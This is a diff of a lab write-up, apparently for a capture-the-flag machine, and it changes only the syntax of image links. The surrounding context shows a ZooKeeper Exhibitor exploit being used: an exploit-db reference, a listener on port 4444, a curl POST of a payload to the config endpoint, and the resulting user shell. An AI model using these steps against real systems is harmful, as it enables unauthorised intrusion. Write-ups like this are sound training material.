@@ -103,7 +103,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
 ```
 
 Found ZooKeeper v1.0 on port 8081:
-![[Pasted image 20260109141110.png]]
+![Pasted image 20260109141110](images/Pasted image 20260109141110.png)
 
 Found exploit for Zookeeper:
 https://www.exploit-db.com/exploits/51819
@@ -157,9 +157,9 @@ Listening on 0.0.0.0 4444
 curl -X POST -d @data.json http://192.168.142.98:8080/exhibitor/v1/config/set
 ```
 
-![[Pasted image 20260109143314.png]]
+![Pasted image 20260109143314](images/Pasted image 20260109143314.png)
 
-![[Pasted image 20260109143329.png]]
+![Pasted image 20260109143329](images/Pasted image 20260109143329.png)
 
 ```sh
 charles@pelican:~$ cat local.txt && date && ifconfig
